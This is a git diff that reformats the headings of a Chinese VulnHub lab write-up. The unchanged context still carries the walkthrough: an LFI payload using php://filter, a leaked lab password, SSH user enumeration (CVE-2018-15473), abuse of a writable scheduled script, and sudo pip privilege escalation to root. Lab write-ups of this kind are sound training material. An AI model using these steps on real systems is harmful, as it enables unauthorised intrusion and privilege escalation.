@@ -23,12 +23,13 @@ tags: [vulnhub]
 - 滥用可写脚本, 300 秒执行一次.( /srv/.antivirus.py )
 - 检查 sudoers，发现低可以运行 pip - Use GTFO Bin to get root
 
-### 网站页面源代码注释,泄露传参
+### 网站页面源代码注释-泄露传参
+
 ```bash
 http://192.168.84.7/?lang=fr
 ```
 
-### 使用 PHP Filters 通过 LFI 查看 php 文件的内容
+### 使用PHP-Filters通过LFI查看php文件的内容
 ```bash
 http://192.168.84.7/?lang=php://filter/read=convert.base64-encode/resource=index
 
@@ -45,14 +46,14 @@ $password ="Niamey4Ever227!!!" ;//I have to remember it
 cewl http://192.168.84.7/ > user.txt
 ```
 
-### 通过 SSH 枚举有效用户名 (CVE-2018-15473)
+### 通过-SSH-枚举有效用户名-(CVE-2018-15473)
 ```bash
 # 得到用户 mamadou
 ssh mamadou@192.168.84.7 -p 3333
 
 pass: Niamey4Ever227!!!
 ```
-### 滥用可写脚本, 300 秒执行一次.( /srv/.antivirus.py )
+### 滥用可写脚本,300秒执行一次.(/srv/.antivirus.py)
 ```bash
 # 服务器中还有另一个用户 devops
 
@@ -66,7 +67,7 @@ find / -name 'devops' 2>/dev/null
 # 文件是怎么运行的?
 grep -Ri '.antivirus.py' /etc/ 2>/dev/null
 ```
-### 检查 sudoers，发现低可以运行 pip - Use GTFO Bin to get root
+### 检查sudoers,发现低可以运行 pip-UseGTFO-Bin-to get-root
 ```bash
 sudo -l
 # (ALL) NOPASSWD: /usr/bin/pip
@@ -97,4 +98,5 @@ cat root.txt
     821ae63dbe0c573eff8b69d451fb21bc
 	
 ```
+
 *过程还有一些flag.txt文件*
